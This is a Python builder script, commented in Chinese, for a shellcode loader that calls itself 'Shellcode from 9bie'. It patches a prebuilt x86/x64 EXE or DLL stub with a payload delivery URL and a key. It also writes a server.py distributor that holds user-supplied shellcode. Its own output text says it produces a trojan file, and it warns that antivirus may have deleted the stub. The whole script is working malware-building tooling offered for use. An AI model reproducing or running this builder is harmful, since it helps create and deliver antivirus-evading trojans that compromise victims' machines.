# coding:utf-8
import os
txt = '''
  _________.__           .__  .__                   .___         _____                         ___________.   .__
 /   _____/|  |__   ____ |  | |  |   ____  ____   __| _/____   _/ ____\______  ____   _____   /   __   \_ |__ |__| ____
 \_____  \ |  |  \_/ __ \|  | |  | _/ ___\/  _ \ / __ |/ __ \  \   __\\_  __ \/  _ \ /     \  \____    /| __ \|  |/ __ \
 /        \|   Y  \  ___/|  |_|  |_\  \__(  <_> ) /_/ \  ___/   |  |   |  | \(  <_> )  Y Y  \    /    / | \_\ \  \  ___/
/_______  /|___|  /\___  >____/____/\___  >____/\____ |\___  >  |__|   |__|   \____/|__|_|  /   /____/  |___  /__|\___  >
        \/      \/     \/               \/           \/    \/                             \/                \/        \/
'''
print(txt)
if os.path.isfile("server.py.default") is False:
    print("找不到server.py.default")
    exit()

print("### 可用版本:")
print("\t1. x86 EXE\n\t2. x86 DLL\n\t3. x64 EXE\n\t4. x64 DLL\n")

a = input("请输入你要编译的序号:")
if a == "1":
    b = "bin/x86.exe"
elif a == "2":
    b = "bin/x86.dll"
elif a == "3":
    b = "bin/x64.exe"
elif a == "4":
    b = "bin/x64.dll"
else:
    print("输入错误")
    exit()
if os.path.isfile(b) is False:
    print("PAYLOAD:{}找不到，你确定编译了吗或者是不是呗杀软杀了".format(b))
    exit()
print("程序随后将会生成server.py和木马文件，server.py作为分发器，请填入待会儿server.py的分发地址")
target = input("请输入你的payload下发地址(例如 https://example.com )，长度不超过255:")
obs = input("请输入自定义密钥，长度不大于30:")
x86_payload = 'buf_x64 = b"' + input("请输入x86payload:") + '"'
x64_payload = 'buf_x86 = b"' + input("请输入x64payload:") + '"'
source_py = open("server.py.default", "r").read()
source_bin = open(b, "rb").read()
source_py = source_py.replace('buf_x64 = b""', x64_payload)
source_py = source_py.replace('buf_x86 = b""', x86_payload)
source_py = source_py.replace('BBBBBBBBBBBBBBBBBBBBBBBBBBBBBB', obs)

i = 0
newberry = bytearray(source_bin)
p = newberry.find(("A" * 255).encode())
for i2 in target:
    newberry[p + i] = ord(i2)
    i += 1
newberry[p + i] = 0
p2 = newberry.find(("B" * 30).encode())
i = 0
for i3 in obs:
    newberry[p2 + i] = ord(i3)
    i += 1
newberry[p2 + i] = 0


f = open("server.py", "w")
f.write(source_py)
a = input("保存地址:")
f2 = open(a, "wb")
f2.write(newberry)
print("写出server.py {} 成功".format(a))
